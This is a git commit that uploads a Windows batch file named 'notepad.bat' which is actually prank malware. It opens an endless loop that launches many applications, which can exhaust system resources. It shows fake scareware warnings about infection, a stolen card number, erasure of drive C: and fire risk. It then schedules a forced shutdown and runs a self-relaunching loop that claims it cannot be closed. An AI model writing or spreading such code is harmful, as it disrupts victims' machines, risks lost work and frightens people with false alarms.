25b45bc988949300e8ff9da4fbb93276dd71b45c
pero812 <petargruevski5@gmail.com>
2025-06-13 23:03:28 +0200

    Add files via upload

---
+++ notepad.bat
@@ -0,0 +1,165 @@
+echo off
+:x
+start explorer
+start notepad
+start mspaint
+start chrome
+start control
+start fortnite
+start steam
+start discord
+start viber
+goto x
+@echo off
+color 47
+net stop themes >nul
+title DEEP VIRAL INFECTION!
+echo VIRAL INFECTION!!!
+echo VIRAL INFECTION!!!
+echo VIRAL INFECTION!!!
+echo ERROR!!!
+echo -
+echo virus - TROJAN_DEMOLISHER code #45643676
+echo -
+echo FIREWALL - FAILED
+echo -
+echo ANTI-VIRUS - FAILED
+echo -
+echo IP ADDRESS BREACHED!
+echo -
+echo VIRUS ATTAINING: ****-****-****-8894
+echo -
+
+pause
+cls
+echo -
+echo SCANNING INFECTED AREAS...
+echo -
+
+pause
+title SCANNING INFECTED AREAS...
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+:end
+cls
+title DEEP VIRAL INFECTION!
+echo -
+echo 86.5 PERCENT OF MEMORY INFECTED
+echo -
+echo INFECTION FATAL!
+echo -
+echo DELETION OF ENTIRE CONTENTS OF LOCAL DISK C: REQUIRED
+echo -
+
+pause
+cls
+echo -
+title DELETING HARD-DRIVE C:
+echo -
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+
+
+cls
+title DEEP VIRAL INFECTION!
+echo -
+echo CONTENTS OF HARD-DRIVE C: ERASED
+echo -
+
+pause
+cls
+echo -
+echo SCANNING...
+echo -
+
+title SCANNING...
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+dir /s "C:\program files\"
+:end1
+cls
+title DEEP VIRAL INFECTION!
+echo -
+echo 0.00 PERCENT OF HARD-DRIVE INFECTED
+echo -
+pause
+
+
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+
+pause
+cls
+title SYSTEM FAILURE
+color 17
+echo ERROR!
+echo -
+echo VISUAL MEMORY LOST!
+echo -
+echo RAM LOST!
+echo -
+echo CORE PROCESSOR FAILING...
+echo -
+echo TOTAL SYSTEM CRASH IMMINENT!
+echo -
+echo -
+
+pause
+cls
+echo -
+echo -
+echo -
+echo SHUTDOWN COMPUTER NOW TO AVOID RISK OF FIRE!
+echo -
+echo -
+echo -
+
+pause
+cls
+echo -
+echo -
+echo -
+echo SEEK PROFESSIONAL HELP IMMEDIATLY TO PREVENT FURTHER DAMAGE!
+echo -
+echo -
+echo -
+pause
+start shutdown /s /t 60 /c "SYSTEM FAILURE<SHUTTING DOWN TO AVOID FURTHER DAMAGE!
+@echo off
+if "%1" equ "Restarted" goto %1
+
+:again
+echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
+goto :again
+
+:Restarted
+echo I am a virus!
+:loop
+echo You can't close me!
+timeout /T 1 > NUL
+goto loop
